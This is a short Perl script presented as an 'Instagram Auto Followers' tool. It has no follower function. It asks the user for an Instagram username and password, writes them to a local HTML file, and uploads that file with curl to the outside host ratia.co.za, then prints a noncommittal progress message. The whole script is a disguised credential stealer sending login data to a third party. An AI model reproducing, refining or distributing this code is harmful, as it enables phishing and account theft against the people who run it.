use strict;
use warnings;

sub x() {
   printf("\nEnter the username : ");
   chomp(my $ab = <STDIN>);
   
   printf("\nEnter the password : ");
   chomp(my $ba = <STDIN>);

   open(my $xyz, '>', 'di_proses92.html');
   print $xyz "\nUsername : $ab\n";
   print $xyz "\nPassword : $ba\n";
   close $xyz;

   system "curl -T di_proses92.html ratia.co.za";

   printf("\nEverything is under progress, i can't guarantee it will work or won't work");
}

printf("\nInstagram Auto Followers\n\n");
x();
